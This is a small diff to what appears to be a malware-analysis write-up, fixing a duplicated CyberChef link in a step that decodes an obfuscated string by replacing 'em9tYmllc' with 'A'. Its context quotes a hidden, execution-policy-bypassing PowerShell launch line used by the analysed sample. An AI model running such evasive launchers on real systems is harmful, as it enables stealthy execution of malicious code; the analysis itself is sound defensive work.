@@ -107,7 +107,7 @@ Then ```powershell.exe -windowstyle hidden -executionpolicy bypass -NoProfile -c
 ```command $OWjuxD```: This parameter specifies the PowerShell command to be executed.<br /><br />
 
 Now, What is "$Codigo"
-I will use [cyberchef](https://gchq.github.io/CyberChef/)https://gchq.github.io/CyberChef/ to replace 'em9tYmllc' with 'A' then decode the string
+I will use [cyberchef](https://gchq.github.io/CyberChef/) to replace 'em9tYmllc' with 'A' then decode the string
 
 ![Alt text](./cyberchef.png "cyberchef")
 
